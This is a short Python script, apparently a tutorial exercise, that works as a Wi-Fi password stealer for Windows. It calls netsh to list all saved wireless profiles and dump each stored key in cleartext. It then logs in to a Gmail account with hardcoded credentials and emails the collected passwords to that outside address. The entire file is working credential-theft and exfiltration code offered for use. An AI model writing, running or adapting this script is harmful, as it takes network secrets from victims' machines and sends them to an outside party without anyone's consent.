#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):  # takes email passwrod and message as inputs
    server = smtplib.SMTP("smtp.gmail.com", 587)  # creates server variable that is an instance of an smtp server using the smtplibrabry
    # specifyin the server we want to use (google) and the port (googles is 587)
    server.starttls()  # initating tls connectioon
    server.login(email, password)  # login
    server.sendmail(email, email, message)  # send an email to ourselves with the message
    server.quit()   # quit the server

command = "netsh wlan show profile"  # lists all previous wifi connections on windows
networks = subprocess.check_output(command, shell=True)  # exectues command and returns the result
netowrk_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)  # looks for text that matches the regex expression in whole string

result = ""  # instantiating it outside the loop to keep appending values until loop is done
for network_name in netowrk_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"  # executing command
    current_result = subprocess.check_output(command, shell=True)  # calling function to get the output
    result = result + current_result  # contains password from first network and adds itself

send_mail("master.miyagi.az@gmail.com", "krebs are number 1", result)  # sends the email w/ the message